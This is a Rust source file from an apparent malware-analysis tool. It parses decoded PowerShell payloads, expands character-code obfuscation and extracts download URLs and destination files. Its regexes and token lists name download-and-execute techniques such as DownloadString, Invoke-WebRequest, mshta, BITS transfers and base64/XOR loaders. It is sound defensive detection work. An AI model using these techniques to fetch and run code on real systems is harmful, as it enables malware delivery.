//! PowerShell payload post-processing: extract URLs and other IOCs from
//! the decoded ps1 content of `env.exec_ps1` / `env.all_extracted_ps1`.
//!
//! Runs our regex-based obfuscation expander over the raw payload, then
//! applies URL-extraction patterns to the simplified source.

#![allow(clippy::items_after_test_module)]

use crate::env::{Environment, FsEntry};
use crate::traits::Trait;
use base64::Engine as _;
use once_cell::sync::Lazy;
use regex::Regex;

// Regex-set patterns. Each capture group #1 is the URL.
// Patterns target common cmdlet/method invocations. Whitespace-tolerant,
// case-insensitive, supports single+double quoted strings.

#[allow(clippy::expect_used)] // regex literals — compile-time constants
static IWR_RE: Lazy<Regex> = Lazy::new(|| {
    // Invoke-WebRequest / iwr / wget / curl (PS alias) — optional -Uri, quoted or unquoted URL
    Regex::new(
        r#"(?i)(?:Invoke-WebRequest|iwr|wget|curl)\b(?:\s+-[A-Za-z][\w-]*)*\s*(?:[^\n|;]*?-Uri(?:\s+|:|=))?\(?\s*["']?((?:https?|ftp|file):[\x2f\x5c]+[^\s"'\);]+)["']?"#
    ).expect("iwr")
});

#[allow(clippy::expect_used)]
static IRM_RE: Lazy<Regex> = Lazy::new(|| {
    // Invoke-RestMethod / irm — optional -Uri, quoted or unquoted URL
    Regex::new(
        r#"(?i)(?:Invoke-RestMethod|irm)\b(?:\s+-[A-Za-z][\w-]*)*\s*(?:[^\n|;]*?-Uri(?:\s+|:|=))?\(?\s*["']?((?:https?|ftp|file):[\x2f\x5c]+[^\s"'\);]+)["']?"#
    ).expect("irm")
});

#[allow(clippy::expect_used)]
static PS_ENV_REF_RE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r#"(?i)\$env:([A-Za-z0-9_.-]+)"#).expect("ps env ref"));

#[allow(clippy::expect_used)]
static PS_SCHEMELESS_IP_CMDLET_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm|wget|curl)\b(?:[^\n|;]*?-(?:Uri|Ur)(?:\s+|:|=)|(?:\s+-[A-Za-z][\w-]*)*\s+)(?:['"])?((?:\d{1,3}\.){3}\d{1,3}(?::\d+)?(?:/[^\s"'\);]*)?)(?:['"])?"#,
    )
    .expect("ps schemeless ip cmdlet")
});

#[allow(clippy::expect_used)]
static PS_SCHEMELESS_DOMAIN_CMDLET_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?ix)
            (?: Invoke-WebRequest | Invoke-RestMethod | iwr | irm | wget | curl ) \b
            (?: [^\n|;]*? - (?: Uri | Ur ) (?: \s+ | : | = ) | (?: \s+ -[A-Za-z][\w-]* )* \s+ )
            (?: ['"] )?
            (
                (?: [a-z0-9\-]+ \. ){1,4}
                (?: com | net | org | io | ru | cn | me | info | biz | us | co | ly | gg | tk | xyz
                  | top | life | store | app | tools | rocks | click | stream | host | website
                  | pw | dev | sh | space | site | live | cloud | online | tech | art | news | pro | cc | to )
                / [^\s"'\);<>]{1,200}
            )
            (?: ['"] )?
        "#,
    )
    .expect("ps schemeless domain cmdlet")
});

#[allow(clippy::expect_used)]
static CURL_EXE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:^|[\s;"'])[\w:./\\-]*curl\.exe\b(?:\s+-[A-Za-z][\w-]*(?:\s+["']?[^"'\s]+["']?)?)*\s+["']?((?:https?|ftp|file):[\x2f\x5c]+[^\s"'\)]+)["']?"#,
    )
    .expect("curl exe")
});

#[allow(clippy::expect_used)]
static MSHTA_URL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\bmshta(?:\.exe)?\s+["']?((?:https?|ftp|file):[\x2f\x5c]+[^\s"';\)]+)["']?"#)
        .expect("mshta url")
});

#[allow(clippy::expect_used)]
static PS_GENERIC_URL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\b((?:https?|ftp|file):[\x2f\x5c]+[^\s"'`;,<>\)\]\}]+)"#)
        .expect("ps generic url")
});

#[allow(clippy::expect_used)]
static DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
    // (New-Object Net.WebClient).DownloadString('url') or .DownloadFile('url', 'dst')
    Regex::new(r#"(?i)\.(?:Download(?:String|File|Data)|OpenRead)(?:(?:Task)?Async)?\s*\(\s*["']([^"']+)["']"#)
        .expect("ds")
});

#[allow(clippy::expect_used)]
static BARE_DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\b(?:Download(?:String|File|Data)|OpenRead)(?:(?:Task)?Async)?\s*\(\s*["']([^"']+)["']"#)
        .expect("bare downloadstring")
});

#[allow(clippy::expect_used)]
static DOWNLOADFILE_CALL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)\bDownloadFile(?:(?:Task)?Async)?\s*\(\s*([^)]{0,2048})\)"#)
        .expect("downloadfile call")
});

#[allow(clippy::expect_used)]
static DOWNLOADFILE_PATH_COMBINE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\bDownloadFile(?:(?:Task)?Async)?\s*\(\s*([^,\r\n]{1,512})\s*,\s*(\[(?:System\.)?IO\.Path\]\s*::\s*Combine\s*\([^)]{1,512}\))\s*\)"#,
    )
    .expect("downloadfile path combine")
});

#[allow(clippy::expect_used)]
static WEBREQUEST_FILESTREAM_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?Net\.WebRequest\]::Create\s*\(\s*["']([^"']+)["']\s*\).*?GetResponseStream\s*\(\s*\).*?New-Object\s+(?:System\.)?IO\.FileStream\s*\(\s*["']([^"']+)["']\s*,\s*\[(?:System\.)?IO\.FileMode\]::Create"#,
    )
    .expect("webrequest filestream download")
});

#[allow(clippy::expect_used)]
static DOWNLOADSTRING_FRAGMENT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\b(?:loadString|ADSTRING)\s*\(\s*'{1,2}(https?://[^'")]+)"#)
        .expect("downloadstring fragment")
});

#[allow(clippy::expect_used)]
static CALLBYNAME_DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)CallByname\s*\([^)]*?["']DownloadString["'][^)]*?["'](https?://[^"']+)["']"#)
        .expect("callbyname downloadstring")
});

#[allow(clippy::expect_used)]
static SELF_B64_MATCH_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)-match\s*['"]([^'"]{4,200}?)\(\[A-Za-z0-9\+/\=\]\+\)['"]"#)
        .expect("self b64 match regex")
});

#[allow(clippy::expect_used)]
static FILE_B64_XOR_LOADER_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(\d{1,3})\s*;.*?\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?:\(\s*(?:gc|cat|type|Get-Content)\s+(?:-(?:Literal)?Path\s+)?(?:['"]([^'"]+)['"]|\$([A-Za-z_][A-Za-z0-9_]*))\s*\)\s*-join\s*['"]{2}|(?:gc|cat|type|Get-Content)\s+-Raw\s+(?:-(?:Literal)?Path\s+)?(?:['"]([^'"]+)['"]|\$([A-Za-z_][A-Za-z0-9_]*))|(?:gc|cat|type|Get-Content)\s+(?:-(?:Literal)?Path\s+)?(?:['"]([^'"]+)['"]|\$([A-Za-z_][A-Za-z0-9_]*))\s+-Raw\b).*?\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\).*?-bxor\s*\$([A-Za-z_][A-Za-z0-9_]*)"#,
    )
    .expect("file b64 xor loader regex")
});

#[allow(clippy::expect_used)]
static START_BITS_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)Start-BitsTransfer\s+(?:[^|]*?-Source\s+)?["']([^"']+)["']"#).expect("bits")
});

#[allow(clippy::expect_used)]
static START_BITS_SCHEMELESS_SOURCE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?ix)
            Start-BitsTransfer \b
            [^\n|;]*? -S(?:o(?:u(?:r(?:c(?:e)?)?)?)?)? (?: \s+ | : | = )
            (?: ['"] )?
            (
                (?: [a-z0-9\-]+ \. ){1,4}
                (?: com | net | org | io | ru | cn | me | info | biz | us | co | ly | gg | tk | xyz
                  | top | life | store | app | tools | rocks | click | stream | host | website
                  | pw | dev | sh | space | site | live | cloud | online | tech | art | news | pro | cc | to )
                / [^\s"'\);<>]{1,200}
            )
            (?: ['"] )?
        "#,
    )
    .expect("bits schemeless source")
});

#[allow(clippy::expect_used)]
static NET_REQ_RE: Lazy<Regex> = Lazy::new(|| {
    // [Net.WebRequest]::Create('url')  /  [System.Net.WebRequest]::Create('url')
    Regex::new(r#"(?i)\[(?:System\.)?Net\.WebRequest\]::Create\s*\(\s*["']([^"']+)["']"#)
        .expect("netreq")
});

struct PsUrlRegexSpec {
    regex: &'static Lazy<Regex>,
    atom_kind: PsUrlRegexAtomKind,
}

#[derive(Clone, Copy, Debug)]
enum PsUrlRegexAtomKind {
    Iwr,
    Irm,
    CmdletUrl,
    CurlExe,
    Mshta,
    UrlScheme,
    DownloadMethod,
    DownloadFragment,
    CallByName,
    StartBits,
    NetWebRequest,
}

struct PsUrlRegexAtomProfile {
    iwr: bool,
    irm: bool,
    cmdlet_url: bool,
    curl_exe: bool,
    mshta: bool,
    url_scheme: bool,
    download_method: bool,
    download_fragment: bool,
    callbyname: bool,
    start_bits: bool,
    net_webrequest: bool,
}

impl PsUrlRegexAtomProfile {
    fn new(text: &str) -> Self {
        let invoke_webrequest = contains_ascii_case_insensitive_bytes(text, b"invoke-webrequest");
        let invoke_restmethod = contains_ascii_case_insensitive_bytes(text, b"invoke-restmethod");
        let iwr = contains_ascii_case_insensitive_bytes(text, b"iwr");
        let irm = contains_ascii_case_insensitive_bytes(text, b"irm");
        let wget = contains_ascii_case_insensitive_bytes(text, b"wget");
        let curl = contains_ascii_case_insensitive_bytes(text, b"curl");

        Self {
            iwr: invoke_webrequest || iwr || wget || curl,
            irm: invoke_restmethod || irm,
            cmdlet_url: invoke_webrequest || invoke_restmethod || iwr || irm || wget || curl,
            curl_exe: contains_ascii_case_insensitive_bytes(text, b"curl.exe"),
            mshta: contains_ascii_case_insensitive_bytes(text, b"mshta"),
            url_scheme: contains_ascii_case_insensitive_bytes(text, b"http:")
                || contains_ascii_case_insensitive_bytes(text, b"https:")
                || contains_ascii_case_insensitive_bytes(text, b"ftp:")
                || contains_ascii_case_insensitive_bytes(text, b"file:"),
            download_method: contains_ascii_case_insensitive_bytes(text, b"downloadstring")
                || contains_ascii_case_insensitive_bytes(text, b"downloadfile")
                || contains_ascii_case_insensitive_bytes(text, b"downloaddata")
                || contains_ascii_case_insensitive_bytes(text, b"openread")
                || contains_ascii_case_insensitive_bytes(text, b"downloadstringasync")
                || contains_ascii_case_insensitive_bytes(text, b"downloadfileasync")
                || contains_ascii_case_insensitive_bytes(text, b"downloaddataasync"),
            download_fragment: contains_ascii_case_insensitive_bytes(text, b"loadstring")
                || contains_ascii_case_insensitive_bytes(text, b"adstring"),
            callbyname: contains_ascii_case_insensitive_bytes(text, b"callbyname"),
            start_bits: contains_ascii_case_insensitive_bytes(text, b"start-bitstransfer"),
            net_webrequest: contains_ascii_case_insensitive_bytes(text, b"net.webrequest"),
        }
    }

    fn matches(&self, kind: PsUrlRegexAtomKind) -> bool {
        match kind {
            PsUrlRegexAtomKind::Iwr => self.iwr,
            PsUrlRegexAtomKind::Irm => self.irm,
            PsUrlRegexAtomKind::CmdletUrl => self.cmdlet_url,
            PsUrlRegexAtomKind::CurlExe => self.curl_exe,
            PsUrlRegexAtomKind::Mshta => self.mshta,
            PsUrlRegexAtomKind::UrlScheme => self.url_scheme,
            PsUrlRegexAtomKind::DownloadMethod => self.download_method,
            PsUrlRegexAtomKind::DownloadFragment => self.download_fragment,
            PsUrlRegexAtomKind::CallByName => self.callbyname,
            PsUrlRegexAtomKind::StartBits => self.start_bits,
            PsUrlRegexAtomKind::NetWebRequest => self.net_webrequest,
        }
    }
}

static PS_URL_REGEX_SPECS: &[PsUrlRegexSpec] = &[
    PsUrlRegexSpec {
        regex: &IWR_RE,
        atom_kind: PsUrlRegexAtomKind::Iwr,
    },
    PsUrlRegexSpec {
        regex: &IRM_RE,
        atom_kind: PsUrlRegexAtomKind::Irm,
    },
    PsUrlRegexSpec {
        regex: &PS_SCHEMELESS_IP_CMDLET_RE,
        atom_kind: PsUrlRegexAtomKind::CmdletUrl,
    },
    PsUrlRegexSpec {
        regex: &PS_SCHEMELESS_DOMAIN_CMDLET_RE,
        atom_kind: PsUrlRegexAtomKind::CmdletUrl,
    },
    PsUrlRegexSpec {
        regex: &CURL_EXE_RE,
        atom_kind: PsUrlRegexAtomKind::CurlExe,
    },
    PsUrlRegexSpec {
        regex: &MSHTA_URL_RE,
        atom_kind: PsUrlRegexAtomKind::Mshta,
    },
    PsUrlRegexSpec {
        regex: &DOWNLOADSTRING_RE,
        atom_kind: PsUrlRegexAtomKind::DownloadMethod,
    },
    PsUrlRegexSpec {
        regex: &BARE_DOWNLOADSTRING_RE,
        atom_kind: PsUrlRegexAtomKind::DownloadMethod,
    },
    PsUrlRegexSpec {
        regex: &DOWNLOADSTRING_FRAGMENT_RE,
        atom_kind: PsUrlRegexAtomKind::DownloadFragment,
    },
    PsUrlRegexSpec {
        regex: &CALLBYNAME_DOWNLOADSTRING_RE,
        atom_kind: PsUrlRegexAtomKind::CallByName,
    },
    PsUrlRegexSpec {
        regex: &START_BITS_RE,
        atom_kind: PsUrlRegexAtomKind::StartBits,
    },
    PsUrlRegexSpec {
        regex: &START_BITS_SCHEMELESS_SOURCE_RE,
        atom_kind: PsUrlRegexAtomKind::StartBits,
    },
    PsUrlRegexSpec {
        regex: &NET_REQ_RE,
        atom_kind: PsUrlRegexAtomKind::NetWebRequest,
    },
    PsUrlRegexSpec {
        regex: &PS_GENERIC_URL_RE,
        atom_kind: PsUrlRegexAtomKind::UrlScheme,
    },
];

#[allow(clippy::expect_used)]
static DYNAMIC_DOWNLOAD_INVOKE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\.\s*\(?\s*(?:'(?P<single_method>(?:(?:Download(?:String|File|Data)|OpenRead)(?:(?:Task)?Async)?|Down))'|"(?P<double_method>(?:(?:Download(?:String|File|Data)|OpenRead)(?:(?:Task)?Async)?|Down))"|(?P<bare_method>(?:(?:Download(?:String|File|Data)|OpenRead)(?:(?:Task)?Async)?|Down))|\$(?P<method_var>[A-Za-z_][A-Za-z0-9_]*))\s*\)?\s*\.Invoke\s*\(\s*(?P<args>[^)]{0,2048})\)"#,
    )
    .expect("dynamic download invoke")
});

#[allow(clippy::expect_used)]
static FOREACH_LITERAL_ARRAY_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)foreach\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s+in\s+@\(\s*(.*?)\s*\)\s*\)"#)
        .expect("foreach literal array")
});

#[allow(clippy::expect_used)]
static PS_ARRAY_LITERAL_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?is)\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*@\(\s*(.*?)\s*\)"#)
        .expect("ps array literal assignment")
});

#[allow(clippy::expect_used)]
static FOREACH_ARRAY_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)foreach\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s+in\s+\$([A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
    )
    .expect("foreach array variable")
});

#[allow(clippy::expect_used)]
static PS_QUOTED_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?s)'((?:[^'\\]|\\.)*)'|"((?:[^"\\]|\\.)*)""#).expect("ps quoted literal")
});

#[allow(clippy::expect_used)]
static OUTFILE_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)-Out(?:F(?:ile)?)?(?:\s+|:|=)(?:\\?'([^'\r\n;]+)\\?'?|\\?"([^"\r\n;]+)\\?"?|([^"'\s]+))"#)
        .expect("outfile")
});

#[allow(clippy::expect_used)]
static CURL_OUTPUT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)(?:^|\s)(?:--output(?:\s+|:|=)|-o\s+)(?:\\?'([^'\r\n;]+)\\?'?|\\?"([^"\r\n;]+)\\?"?|([^"'\s;]+))|(?:^|\s)-[A-Za-z]*o(?:\\?'([^'\r\n;]+)\\?'?|\\?"([^"\r\n;]+)\\?"?|((?:[A-Za-z]:|[\\/])[^"'\s;]+))"#,
    )
    .expect("curl output")
});

#[allow(clippy::expect_used)]
static BITS_DESTINATION_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)-(?:Destination|Dest)(?:\s+|:|=)(?:\\?'([^'\r\n;]+)\\?'?|\\?"([^"\r\n;]+)\\?"?|([^"'\s;]+))"#)
        .expect("bits destination")
});

#[allow(clippy::expect_used)]
static CONTENT_REDIRECT_DESTINATION_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\)\s*\.\s*content\s*>{1,2}\s*(?:\\?'([^'\r\n;&|]+)\\?'?|\\?"([^"\r\n;&|]+)\\?"?|([^"'\s;&|]+))"#)
        .expect("content redirect destination")
});

// ---- PowerShell obfuscation expansion pre-pass ----

fn logical_statement_at(text: &str, pos: usize) -> &str {
    let start = text[..pos]
        .rfind(['\r', '\n', ';'])
        .map_or(0, |idx| idx + 1);
    let end = text[pos..]
        .find(['\r', '\n', ';'])
        .map_or(text.len(), |idx| pos + idx);
    text[start..end].trim()
}

fn first_capture_string(caps: regex::Captures<'_>) -> Option<String> {
    (1..caps.len())
        .filter_map(|idx| caps.get(idx).map(|m| m.as_str()))
        .find(|value| !value.is_empty())
        .map(str::to_string)
}

fn outfile_hint_from(text: &str) -> Option<String> {
    OUTFILE_RE
        .captures(text)
        .or_else(|| BITS_DESTINATION_RE.captures(text))
        .or_else(|| CURL_OUTPUT_RE.captures(text))
        .or_else(|| CONTENT_REDIRECT_DESTINATION_RE.captures(text))
        .and_then(first_capture_string)
        .map(normalize_destination_hint)
}

fn outfile_hint_for_download(text: &str, src: &str) -> Option<String> {
    outfile_hint_from(text).or_else(|| start_bits_positional_destination(text, src))
}

fn start_bits_positional_destination(statement: &str, src: &str) -> Option<String> {
    if !contains_ascii_case_insensitive_bytes(statement, b"start-bitstransfer") {
        return None;
    }

    let tokens = crate::handlers::util::split_words(statement);
    let command_idx = tokens.iter().position(|token| {
        crate::handlers::util::strip_outer_quotes(token)
            .trim_start_matches(['&', '.'])
            .eq_ignore_ascii_case("start-bitstransfer")
    })?;

    let mut operands = Vec::new();
    let mut pending_parameter: Option<BitsParameter> = None;
    for token in tokens.iter().skip(command_idx + 1) {
        let token = crate::handlers::util::strip_outer_quotes(token);
        if token.is_empty() {
            continue;
        }

        if let Some(parameter) = pending_parameter.take() {
            if matches!(parameter, BitsParameter::Source) && bits_token_matches_source(token, src) {
                operands.push(token.to_string());
            }
            continue;
        }

        if let Some(parameter) = bits_parameter_token(token) {
            if let Some(value) = bits_inline_parameter_value(token) {
                if matches!(parameter, BitsParameter::Source)
                    && bits_token_matches_source(value, src)
                {
                    operands.push(value.to_string());
                }
            } else if parameter.takes_value() {
                pending_parameter = Some(parameter);
            }
            continue;
        }

        operands.push(token.to_string());
    }

    let src_idx = operands
        .iter()
        .position(|operand| bits_token_matches_source(operand, src))?;
    operands
        .get(src_idx + 1)
        .filter(|dst| !bits_token_matches_source(dst, src))
        .map(|dst| normalize_destination_hint(dst.clone()))
}

#[derive(Clone, Copy)]
enum BitsParameter {
    Source,
    Destination,
    Value,
    Switch,
}

impl BitsParameter {
    fn takes_value(self) -> bool {
        !matches!(self, Self::Switch)
    }
}

fn bits_parameter_token(token: &str) -> Option<BitsParameter> {
    let parameter = token.strip_prefix('-')?;
    let name = parameter
        .split_once([':', '='])
        .map_or(parameter, |(name, _)| name)
        .to_ascii_lowercase();
    match name.as_str() {
        "source" | "src" => Some(BitsParameter::Source),
        "destination" | "dest" => Some(BitsParameter::Destination),
        "asynchronous" | "async" | "suspended" | "dynamic" | "notifyflags" | "notransfer"
        | "resume" | "suspend" | "cancel" | "complete" | "verbose" | "debug" => {
            Some(BitsParameter::Switch)
        }
        "displayname" | "description" | "transfertype" | "priority" | "retryinterval"
        | "retrytimeout" | "maxdownloadtime" | "transferpolicy" | "credential" | "proxyusage"
        | "proxylist" | "proxycredential" | "authentication" | "certstorelocation"
        | "certstorename" | "certthumbprint" | "securityflags" => Some(BitsParameter::Value),
        _ => Some(BitsParameter::Value),
    }
}

fn bits_inline_parameter_value(token: &str) -> Option<&str> {
    token
        .split_once([':', '='])
        .map(|(_, value)| crate::handlers::util::strip_outer_quotes(value))
        .filter(|value| !value.is_empty())
}

fn bits_token_matches_source(token: &str, src: &str) -> bool {
    crate::handlers::util::normalize_url_like_token(token).is_some_and(|url| url == src)
}

fn normalize_destination_hint(mut value: String) -> String {
    if value.ends_with('\\') && destination_basename_looks_like_file(&value[..value.len() - 1]) {
        value.pop();
    }
    value
}

fn destination_basename_looks_like_file(value: &str) -> bool {
    let Some(basename) = value
        .rsplit(['\\', '/'])
        .next()
        .filter(|name| !name.is_empty())
    else {
        return false;
    };
    let Some((stem, ext)) = basename.rsplit_once('.') else {
        return false;
    };
    !stem.is_empty()
        && (1..=8).contains(&ext.len())
        && ext
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'_' || b == b'-')
}

fn ps_downloaded_script_execution_cmd(statement: &str, dst: &str) -> Option<String> {
    let script_kind = destination_script_kind(dst)?;
    let lower_statement = statement.to_ascii_lowercase();
    let lower_dst = dst.to_ascii_lowercase();
    let mut search_start = 0;
    while let Some(rel_pos) = lower_statement[search_start..].find(&lower_dst) {
        let pos = search_start + rel_pos;
        let segment_start = statement[..pos]
            .rfind(['\r', '\n', ';', '{', '}', '&', '|'])
            .map_or(0, |idx| idx + 1);
        let after_dst = pos + lower_dst.len();
        let segment_end = statement[after_dst..]
            .find(['\r', '\n', ';', '{', '}', '&', '|'])
            .map_or(statement.len(), |idx| after_dst + idx);
        let segment = &statement[segment_start..segment_end];
        let lower_segment = segment.to_ascii_lowercase();
        if segment.contains('>') || ps_segment_looks_like_download(&lower_segment) {
            search_start = pos + lower_dst.len();
            continue;
        }
        if contains_script_invocation(&lower_segment, script_kind) {
            let segment = strip_matching_outer_segment_quotes(segment.trim()).trim();
            let segment = strip_unmatched_trailing_segment_double_quote(segment).trim();
            return Some(segment.to_string());
        }
        search_start = pos + lower_dst.len();
    }
    None
}

fn strip_matching_outer_segment_quotes(s: &str) -> &str {
    let bytes = s.as_bytes();
    if bytes.len() >= 2
        && matches!(bytes.first(), Some(b'"' | b'\''))
        && bytes.first() == bytes.last()
    {
        &s[1..s.len() - 1]
    } else {
        s
    }
}

fn strip_unmatched_trailing_segment_double_quote(s: &str) -> &str {
    let Some(prefix) = s.strip_suffix('"') else {
        return s;
    };
    if prefix.as_bytes().contains(&b'"') {
        s
    } else {
        prefix
    }
}

#[derive(Copy, Clone)]
enum PsDownloadedScriptKind {
    PowerShell,
    ScriptHost,
    Batch,
    Executable,
}

fn destination_script_kind(dst: &str) -> Option<PsDownloadedScriptKind> {
    let dst = dst
        .trim()
        .trim_matches(['"', '\''])
        .trim_end_matches(['"', '\'', ')', ']', '}', ';', ','])
        .to_ascii_lowercase();
    if dst.ends_with(".ps1") || dst.ends_with(".psm1") {
        return Some(PsDownloadedScriptKind::PowerShell);
    }
    if [".js", ".jse", ".vbs", ".vbe", ".wsf"]
        .iter()
        .any(|suffix| dst.ends_with(suffix))
    {
        return Some(PsDownloadedScriptKind::ScriptHost);
    }
    if dst.ends_with(".bat") || dst.ends_with(".cmd") {
        return Some(PsDownloadedScriptKind::Batch);
    }
    if dst.ends_with(".exe") || dst.ends_with(".scr") || dst.ends_with(".com") {
        return Some(PsDownloadedScriptKind::Executable);
    }
    None
}

fn contains_script_invocation(lower_segment: &str, script_kind: PsDownloadedScriptKind) -> bool {
    if lower_segment.split(is_command_token_boundary).any(|token| {
        matches!(
            token,
            "start-process" | "saps" | "start" | "start-process.exe"
        )
    }) {
        return true;
    }
    lower_segment.split(is_command_token_boundary).any(|token| {
        matches!(
            (script_kind, token),
            (
                PsDownloadedScriptKind::PowerShell,
                "powershell" | "powershell.exe" | "pwsh" | "pwsh.exe"
            ) | (
                PsDownloadedScriptKind::ScriptHost,
                "wscript" | "wscript.exe" | "cscript" | "cscript.exe"
            ) | (PsDownloadedScriptKind::Batch, "cmd" | "cmd.exe" | "call")
                | (
                    PsDownloadedScriptKind::Executable,
                    "cmd" | "cmd.exe" | "call"
                )
        )
    })
}

fn is_command_token_boundary(ch: char) -> bool {
    !matches!(ch, 'a'..='z' | '0'..='9' | '_' | '-' | '.')
}

fn ps_segment_looks_like_download(lower_segment: &str) -> bool {
    lower_segment.contains("downloadfile")
        || lower_segment.contains("invoke-webrequest")
        || lower_segment.contains("start-bitstransfer")
        || lower_segment.contains(" -outfile")
        || lower_segment.contains(" -outf")
        || lower_segment.contains(" -out ")
        || lower_segment.contains(" -o ")
        || lower_segment.contains(" -uri ")
}

fn push_download_and_execution_url_argument(
    env: &mut Environment,
    cmd: String,
    src: String,
    dst: Option<String>,
    statement: &str,
) {
    let execution_cmd = dst
        .as_deref()
        .and_then(|dst| ps_downloaded_script_execution_cmd(statement, dst));
    let execution_url = execution_cmd.as_ref().map(|_| src.clone());
    env.traits.push(Trait::Download {
        cmd: cmd.clone(),
        src,
        dst,
    });
    if let (Some(execution_cmd), Some(url)) = (execution_cmd, execution_url) {
        push_url_argument_once(env, &execution_cmd, url);
    }
}

fn push_url_argument_once(env: &mut Environment, cmd: &str, url: String) {
    if !env.traits.iter().any(|t| {
        matches!(
            t,
            Trait::UrlArgument { cmd: existing_cmd, url: existing_url }
                if existing_cmd == cmd && existing_url == &url
        )
    }) {
        env.traits.push(Trait::UrlArgument {
            cmd: cmd.to_string(),
            url,
        });
    }
}

#[allow(clippy::expect_used)]
static CHAR_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    // Must have at least two + separators (3+ [char] terms) to avoid matching plain [char]N
    Regex::new(r"(?i)(?:\[char\]\s*\(?\s*(?:0x[0-9a-f]+|\d+)(?:\s*[+-]\s*(?:0x[0-9a-f]+|\d+))*\s*\)?\s*\+\s*){2,}\[char\]\s*\(?\s*(?:0x[0-9a-f]+|\d+)(?:\s*[+-]\s*(?:0x[0-9a-f]+|\d+))*\s*\)?")
        .expect("char concat regex")
});

#[allow(clippy::expect_used)]
static CHAR_INNER_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)\[char\]\s*\(?\s*((?:0x[0-9a-f]+|\d+)(?:\s*[+-]\s*(?:0x[0-9a-f]+|\d+))*)\s*\)?",
    )
    .expect("inner char regex")
});

#[allow(clippy::expect_used)]
static CHAR_LITERAL_CONCAT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[char\]\s*\(?\s*((?:0x[0-9a-f]+|\d+)(?:\s*[+-]\s*(?:0x[0-9a-f]+|\d+))*)\s*\)?\s*\+\s*(?:'((?:''|[^'])*)'|"([^"`$\\]*(?:\\.[^"`$\\]*)*)")"#,
    )
    .expect("char literal concat regex")
});

fn expand_char_concat(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = CHAR_CONCAT_RE
        .find_iter(text)
        .filter_map(|m| {
            let s = m.as_str();
            let mut chars = Vec::new();
            // Inner regex to extract each [char]N value
            for cap in CHAR_INNER_RE.captures_iter(s) {
                let n = parse_ps_char_codepoint(cap.get(1)?.as_str())?;
                if let Some(c) = char::from_u32(n) {
                    chars.push(c);
                }
            }
            let s_out: String = chars.into_iter().collect();
            Some((m.start(), m.end(), format!("'{}'", s_out)))
        })
        .collect();
    let mut result = text.to_string();
    // Apply replacements in reverse so byte offsets stay valid
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

fn expand_char_literal_concat(text: &str) -> String {
    let matches: Vec<(usize, usize, String)> = CHAR_LITERAL_CONCAT_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let ch = char::from_u32(parse_ps_char_codepoint(caps.get(1)?.as_str())?)?;
            let literal = caps
                .get(2)
                .map(|m| m.as_str().replace("''", "'"))
                .or_else(|| caps.get(3).map(|m| m.as_str().to_string()))?;
            let value = format!("{ch}{literal}").replace('\'', "''");
            Some((full.start(), full.end(), format!("'{value}'")))
        })
        .collect();
    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

fn parse_ps_char_codepoint(expr: &str) -> Option<u32> {
    let expr = expr.trim();
    if expr.is_empty() {
        return None;
    }
    if let Some(value) = parse_ps_char_codepoint_atom(expr) {
        return Some(value);
    }

    let mut acc = 0i64;
    let mut sign = 1i64;
    let mut start = 0usize;
    let mut saw_operator = false;
    let mut saw_term = false;
    let bytes = expr.as_bytes();
    let mut i = 0usize;
    while i < bytes.len() {
        match bytes[i] {
            b'+' | b'-' => {
                let term = expr[start..i].trim();
                if term.is_empty() {
                    if !saw_term {
                        sign = if bytes[i] == b'-' { -1 } else { 1 };
                        start = i + 1;
                        i += 1;
                        continue;
                    }
                    return None;
                }
                acc += sign * i64::from(parse_ps_char_codepoint_atom(term)?);
                saw_term = true;
                saw_operator = true;
                sign = if bytes[i] == b'-' { -1 } else { 1 };
